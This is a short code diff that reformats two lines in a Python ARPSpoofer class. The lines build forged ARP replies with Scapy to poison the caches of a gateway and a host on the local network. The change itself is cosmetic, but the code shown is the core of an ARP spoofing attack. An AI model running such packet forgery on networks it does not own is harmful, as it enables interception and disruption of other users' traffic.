@@ -61,8 +61,10 @@ class ARPSpoofer:
         # 2 packets = 1 gateway packet, 1 host packet
         # Wrapped in Ethernet frames to resolve Scapy warnings
         packets = [
-            Ether(dst=self.gateway_mac) / ARP(op=2, psrc=host.ip, pdst=self.gateway_ip, hwdst=self.gateway_mac),
-            Ether(dst=host.mac) / ARP(op=2, psrc=self.gateway_ip, pdst=host.ip, hwdst=host.mac),
+            Ether(dst=self.gateway_mac) / ARP(op=2, psrc=host.ip,
+                                              pdst=self.gateway_ip, hwdst=self.gateway_mac),
+            Ether(dst=host.mac) / ARP(op=2, psrc=self.gateway_ip,
+                                      pdst=host.ip, hwdst=host.mac),
         ]
 
         [sendp(x, iface=self.interface, verbose=0) for x in packets]
